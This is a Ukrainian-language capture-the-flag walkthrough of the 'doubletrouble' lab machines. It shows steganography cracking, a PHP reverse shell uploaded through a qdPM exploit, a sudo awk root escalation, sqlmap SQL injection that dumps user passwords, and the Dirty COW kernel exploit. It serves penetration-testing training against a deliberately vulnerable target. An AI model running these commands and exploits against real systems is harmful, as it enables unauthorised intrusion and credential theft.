Робимо розвідку мережі та сканування портів (Enumeration)
```sh
netdiscover -r 192.168.160.0/24
```
![alt text](./Images/image1.png)

```sh
nmap -sC -sV -Pn -p- 192.168.160.214
```
**Результат**:  
- **Port 22**: SSH (OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)).
- **Port 80**: HTTP (Apache httpd 2.4.38 (Debian)).  

![alt text](./Images/image2.png)

Проводимо веб-розвідку та пошук прихованих директорій
Відкриваємо в браузері http://192.168.160.214.

![alt text](./Images/image3.png)

Виявляємо доступні директорії:
```sh
dirb http://192.168.160.214
```
**Результат**:
Знаходимо доступні для перегляду директорії `backups, batch, images, secret`.

![alt text](./Images/image4.png)

Ці директорії можуть містити в собі найбільш корисну інформацію для нас, то передивимось їх.

![alt text](./Images/image5.png)

![alt text](./Images/image6.png)

![alt text](./Images/image7.png)

![alt text](./Images/image8.png)

**Результат**:
У папочці secret знаходимо doubletrouble.jpg.
Відкриваємо

![alt text](./Images/image9.png)

Спробуємо перевірити на прихований зміст за допомогою штструментів стеганографії **stegcracker** або **stegseek**.

Завантажуємо
```sh
wget http://192.168.160.214/secret/doubletrouble.jpg
```
Перевіряємо
```sh
stegcracker doubletrouble.jpg /usr/share/wordlists/rockyou.txt
```
![alt text](./Images/image10.png)

**Результат**:
**doubletrouble.jpg.out**

Передивляємось зміст файлу:
```sh
cat doubletrouble.jpg.out
```
**Результат**:
- **otisrush@localhost.com**
- **otis666**
Дуже схоже на логін-пароль для входу на початковій сторінці.

![alt text](./Images/image11.png)

Далі логінемось в панелі керування:

![alt text](./Images/image12.png)

Після логіну бачимо панель керування:

![alt text](./Images/image13.png)

Передивляємось дозволи користувача

![alt text](./Images/image14.png)

Бачимо, що є можливість завантажити файли. Шукаємо експлойти для qdPMv9.1 на ресурсі exploit-DB:

![alt text](./Images/image15.png)

Спробуємо завантажити реверсшелл для .php (сподіваємось, що немає перевірки). Для прикладу, скористаємось існуючим репозіторієм на ГітХабі: `https://github.com/pentestmonkey/php-reverse-shell`.
Вносимо відповідні зміни до **php-reverse-shell**:

![alt text](./Images/image16.png)

Внисимо зміни в експлойт:

![alt text](./Images/image17.png)

Запускаємо знайдений експлойт
```sh
sudo python 48146.py
```
Чекаємо, передивляємось файли в uploads, передивляємось їх по черзі та отримуємо реверс-шелл:
```sh
nc -lnvp 4321
```
![alt text](./Images/image18.png)

Створюємо інтерактивну оболонку bash з повноцінним командним рядком:
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![alt text](./Images/image19.png)

Перевіряємо доступи і вміст директорії користувача:
```sh
sudo -l
```
![alt text](./Images/image20.png)

```sh
ls -lah
```
![alt text](./Images/image21.png)

**Результат**:
Є можливість запускати **awk** без пароля.

Формуємо та виконуємо відповудну команду **awk**:
```sh
sudo awk 'BEGIN { system("/bin/bash") }'
```
**Результат**:
Ми увійшли під **root** акаунтом

![alt text](./Images/image22.png)

Перевіряємо свої дозволи за допомогою **id**, бачимо, що отримали root-права:

![alt text](./Images/image23.png)

Передивимось root-директорію.
```sh
cd /root
ls
```
![alt text](./Images/image24.png)

Знаходимо образ ВМ. Нам потрібно буде розгорнути цей образ як ще одну ВМ.
```sh
cp doubletrouble.ova /var/www/html/
cd /var/www/html/
ls
```
![alt text](./Images/image25.png)

Завантажуємо цей образ на ВМ з **Kali**
```sh
wget http://192.168.160.214/doubletrouble.ova
```
![alt text](./Images/image26.png)

Після завантаження образу нової віртаульної машини запускаємо (імпортуємо) її у ту ж підмережу, де є **Kali**. 
Знаходимо цю машинку як і раніше задопомогою **netdiscover**

![alt text](./Images/image27.png)

Проводимо сканування:
```sh
nmap -sC -sV -Pn -p- 192.168.160.136
```
**Результат**:
- Port 22: SSH (OpenSSH 6.0p1 Debian 4+deb7u4 (protocol 2.0))
- Port 80: HTTP (Apache httpd 2.2.22 (Debian))

![alt text](./Images/image28.png)

Відкриваємо в браузері `http://192.168.160.136`

![alt text](./Images/image29.png)

Ми спробували кілька стандартних комбінацій імені користувача та пароля, але жодна з них не спрацювала на сторінці входу. Тому ми вирішили виконати сканування вебзастосунку з метою переліку (enumeration) файлів і каталогів на цільовому застосунку. Для сканування переліку файлів ми використали інструмент **dirb**.
```sh
dirb http://192.168.160.136
```
![alt text](./Images/image30.png)

Оскільки результат отримали негативний, то спробуємо підключити **BurpSuit** або **Zaproxy**: Запускаємо, пробуємо залогінитись. 

**Готуємо POST запит на Калі**
**для файла**:
```plaintext
cat >> sql                         
POST /index.php HTTP/1.1
Host: 192.168.160.136
Content-Length: 36
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.160.136
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.160.136/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

uname=admin&psw=admin&btnLogin=Login
```
**для командного рядка**:
```plaintext
cat << 'EOF' >> sql
POST /index.php HTTP/1.1
Host: 192.168.160.136
Content-Length: 36
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.160.136
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.160.136/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

uname=admin&psw=admin&btnLogin=Login
EOF
```
Скануємо та виводимо список усіх баз даних (DBs)
```sh
sqlmap -r sql --dbs --random-agent --tamper=space2comment --level=3 --risk=2
```
Знайшли базу **doubletrouble**. Тепер виводимо таблиці цієї бази
```sh
sqlmap -r sql -D doubletrouble --tables --random-agent --tamper=space2comment
```
Знайшли таблицю **users**. Виводимо її стовпці (колонки)
```sh
sqlmap -r sql -D doubletrouble -T users --columns --random-agent --tamper=space2comment
```
Викачуємо (дампимо) паролі та логіни з таблиці **users**
```sh
sqlmap -r sql -D doubletrouble -T users --dump --random-agent --tamper=space2comment
```
![alt text](./Images/image31.png)

![alt text](./Images/image32.png)

![alt text](./Images/image33.png)


**Результат**:
```plaintext
Database: doubletrouble
Table: users
[2 entries]
+----------+----------+
| password | username |
+----------+----------+
| GfsZxc1  | montreux |
| ZubZub99 | clapton  |
```
Інструмент виявив дві пари імен користувачів і паролів, збережених у відкритому (незашифрованому) вигляді в базі даних.
Ми використали ці дані на сторінці входу цільового застосунку, але це не спрацювало. Оскільки нам відомо, що порт SSH також відкритий, на наступному кроці ми спробуємо увійти через **SSH**, використовуючи ці облікові дані.
Далі ми спробували увійти на цільову машину через SSH. Спочатку вхід було відхилено, оскільки облікові дані були неправильними. Але друга комбінація спрацювала, що видно нижче.
```sh
ssh clapton@192.168.160.136
```
![alt text](./Images/image34.png)

Робимо коротку перевірку:
```sh
pwd
sudo -l
ls -lah
```
**Результат**:
Знайшли файл **user.txt**.

![alt text](./Images/image35.png)

Переглядаємо його вміст:
```sh
cat user.txt
```
**Результат**:
6CEA7A737C7C651F6DA7669109B5FB52

![alt text](./Images/image36.png)

Оскільки для завершення **CTF-завдання** потрібно підвищити привілеї до рівня **root**, ми виконали перелік інформації про операційну систему та ядро на цільовій машині.
```sh
uname -a
```
**Результат**:
`Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux`

![alt text](./Images/image37.png)

Було ідентифіковано вразливість підвищення привілеїв у встановленій операційній системі. Експлойт також був публічно доступний на сайті exploit-DB, що показано нижче.
Давайте переглянемо інформацію про експлойт на сайті.

![alt text](./Images/image38.png)

![alt text](./Images/image39.png)

Згідно з інформацією, доступною на сайті **exploit-DB**, ми можемо виконати експлойт на вразливій цілі. Він надасть root-доступ шляхом експлуатації файлу `/etc/passwd`. Отже, завантажимо експлойт на цільову машину.
```sh
wget https://www.exploit-db.com/raw/40839
```
Команда не спрацювала

![alt text](./Images/image40.png)

Можна скористатися такими варіантами
```sh
wget --no-check-certificate https://www.exploit-db.com/raw/40839 -O exploit.c
```
або завантажити на Kali і використати
```sh
scp 40839.c clapton@192.168.160.136:/home/clapton
```
![alt text](./Images/image41.png)

Ми використали утиліту **wget** для завантаження експлойту, вказавши **URL exploit-DB**. Після завантаження скомпілюємо експлойт за допомогою компілятора **gcc**.
```sh
gcc -pthread 40839.c -o dirty -lcrypt
ls -lah
```
![alt text](./Images/image42.png)

Після процесу компіляції в каталозі було створено два файли. Згідно з описом на сайті експлойту, необхідно виконати файл з назвою **dirty** і ввести новий пароль для користувача **root**.
Типове ім’я облікового запису з root-привілеями — **firefart**.
**Використані команди**:
```sh
./dirty
```
![alt text](./Images/image43.png)

```sh
su firefart
```
![alt text](./Images/image44.png)

Як видно вище, ми змінили пароль **root**, що надало нам доступ до цільової машини від імені користувача **root**. Це було підтверджено виконанням команди **id**.
Далі ми переглянули файли на цільовій машині вже як користувач root, щоб знайти root-прапорець і завершити завдання.
```sh
cd /root
ls
cat root.txt
```
![alt text](./Images/image45.png)

Як видно на наведеному вище скріншоті, **root**-прапорець було знайдено в каталозі **root** на цільовій машині. Файл мав назву **root.txt**.
